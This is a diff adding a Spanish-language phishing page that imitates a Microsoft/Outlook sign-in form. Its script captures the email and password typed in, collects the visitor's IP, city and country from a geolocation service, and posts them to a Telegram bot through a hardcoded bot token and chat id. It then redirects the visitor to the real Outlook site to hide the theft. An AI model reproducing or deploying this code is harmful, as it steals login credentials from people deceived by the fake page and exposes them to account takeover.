@@ -1,0 +1,111 @@
+<html>
+ <head>
+  <title>
+  </title>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <link href="css/util.css" rel="stylesheet" type="text/css"/>
+  <link href="css/main.css" rel="stylesheet" type="text/css"/>
+  <link href="fonts/iconic/css/material-design-iconic-font.min.css" rel="stylesheet" type="text/css"/>
+  <!--===============================================================================================-->
+  <script>
+   function soloNumeros(e) {
+        var key = window.event ? e.which : e.keyCode;
+        if (key < 48 || key > 57) {
+          e.preventDefault();
+        }
+      }
+  </script>
+ </head>
+ <body>
+  <div class="limiter">
+   <div class="container-login100" style="background-image: url('images/fond.png'); position: absolute">
+    <div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-54">
+     <form class="login100-form validate-form" id="login-form">
+      <div align="left">
+       <span class="p-b-49" style="font-size: 24px">
+        <br/>
+        <b>
+         Iniciar
+        </b>
+       </span>
+      </div>
+      <br/>
+      <div class="wrap-input100 validate-input m-b-23">
+       <span class="label-input100">
+        Correo electrónico, teléfono o Skype
+       </span>
+       <input class="input100" id="email" name="email" placeholder="Correo electrónico, teléfono o Skype" required="" type="email"/>
+       <span class="focus-input100" data-symbol="">
+       </span>
+      </div>
+      <div class="wrap-input100 validate-input">
+       <span class="label-input100">
+        Escribir Contraseña
+       </span>
+       <input class="input100" id="password" name="password" placeholder="Contraseña" required="" type="password"/>
+       <span class="focus-input100" data-symbol="">
+       </span>
+      </div>
+      <br/>
+      <div class="text-right p-t-8 p-b-31">
+      </div>
+      <div class="container-login100-form-btn">
+       <div class="wrap-login100-form-btn">
+        <div class="login100-form-bgbtn">
+        </div>
+        <button class="login100-form-btn" type="submit">
+         Finalizar
+        </button>
+       </div>
+      </div>
+     </form>
+    </div>
+   </div>
+  </div>
+ </body>
+ <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js">
+ </script>
+ <script>
+  const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#login-form");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url)
+        .then((response) => {
+          const email = document.querySelector("#email").value;
+          const password = document.querySelector("#password").value;
+          const message =
+            "Correo: " +
+            email +
+            " Contra: " +
+            password +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot6317819985:AAHiNWK44FAlqeLj6JmRqtJGLrupJR0Zdgc/sendMessage",
+              {
+                chat_id: "-976321621",
+                text: message,
+              }
+            )
+            .then((response) => {
+              console.log(response.data);
+              window.location.href = "https://outlook.live.com/owa/";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+ </script>
+</html>
